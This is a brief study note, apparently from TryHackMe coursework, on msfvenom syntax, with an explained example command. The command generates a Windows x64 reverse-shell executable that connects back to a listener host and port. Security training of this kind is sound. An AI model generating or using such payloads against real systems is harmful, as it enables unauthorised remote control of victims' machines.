# msfvenom

general syntax 

```jsx
msfvenom -p <PAYLOAD> <OPTIONS>
```

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

- **f** <format>
- Specifies the output format. In this case that is an executable (exe)
- **o** <file>
- The output location and filename for the generated payload.
- **LHOST=**<IP>
- Specifies the IP to connect back to. When using TryHackMe, this will be your [tun0 IP address](http://10.10.10.10/). If you cannot load the link then you are not [connected to the VPN](https://tryhackme.com/room/welcome).
- **LPORT=**<port>
- The port on the local machine to connect back to. This can be anything
between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
